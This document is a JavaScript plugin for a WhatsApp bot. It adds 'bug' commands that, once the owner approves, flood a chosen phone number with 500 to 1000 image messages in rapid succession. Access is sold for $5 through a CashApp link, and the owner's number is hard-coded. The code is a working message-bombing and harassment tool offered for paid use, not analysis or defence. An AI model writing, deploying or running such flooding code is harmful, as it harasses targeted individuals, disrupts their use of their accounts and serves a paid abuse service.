const { cmd } = require('../command');
const store = {};
const premium = {};
const OWNER_NUMBER = '50942241547@s.whatsapp.net';

function delay(ms) {
  return new Promise(res => setTimeout(res, ms));
}

function addBugCommand(name, desc, count) {
  cmd({
    pattern: name,
    desc: desc,
    category: 'bug',
    filename: __filename,
  }, async (conn, m, { args, reply }) => {
    const sender = m.sender;

    if (sender !== OWNER_NUMBER && !premium[sender]) {
      return conn.sendMessage(m.chat, {
        image: { url: 'https://i.imgur.com/nL0E1dn.png' },
        caption: `💵 To use the ${name.toUpperCase()} bug:\nPay *$5* on *CashApp*\n\n🔗 https://cash.app/$berryxoe\n\nAfter payment, you will receive access.\n❗ Send proof of payment to *${OWNER_NUMBER.split('@')[0]}*`,
      }, { quoted: m });
    }

    const number = args[0];
    if (!number) return reply(`❌ Example: *.${name} 13057487562*`);
    const target = number + '@s.whatsapp.net';
    store[m.key.id] = { target, count, sender };

    await conn.sendMessage(OWNER_NUMBER, {
      text: `📩 @${sender.split('@')[0]} requested *${name.toUpperCase()} bug* to:\n*${number}*\n\n🆔 ID: ${m.key.id}\n✅ Reply: *yes ${m.key.id}* or *no ${m.key.id}*`,
      mentions: [sender]
    }, { quoted: m });
  });
}

addBugCommand('zarya', 'Send ZARYA bug (500 messages)', 500);
addBugCommand('dawens', 'Send DAWENS bug (800 messages)', 800);
addBugCommand('xios', 'Send XIOS bug (1000 messages)', 1000);

conn.ev.on('messages.upsert', async ({ messages }) => {
  const m = messages[0];
  if (!m.message?.conversation) return;

  const from = m.key.remoteJid;
  if (from !== OWNER_NUMBER) return;

  const text = m.message.conversation.toLowerCase().trim();
  const [status, id] = text.split(' ');

  if (status !== 'yes' && status !== 'no') return;

  const data = store[id];
  if (!data) return await conn.sendMessage(from, { text: '⛔ No request found with that ID.' });

  if (status === 'yes') {
    premium[data.sender] = true;
    await conn.sendMessage(from, { text: `🚀 Sending ${data.count} bug messages to ${data.target}...` });

    for (let i = 0; i < data.count; i++) {
      await conn.sendMessage(data.target, {
        image: { url: 'https://files.catbox.moe/pbamxw.jpeg' },
        caption: 'ZARYA BUG 🐛',
      });
      await delay(60);
    }

    await conn.sendMessage(from, { text: '✅ Bug successfully sent ✨💀' });
  } else {
    await conn.sendMessage(from, { text: '❌ Bug request denied.' });
  }

  delete store[id];
});
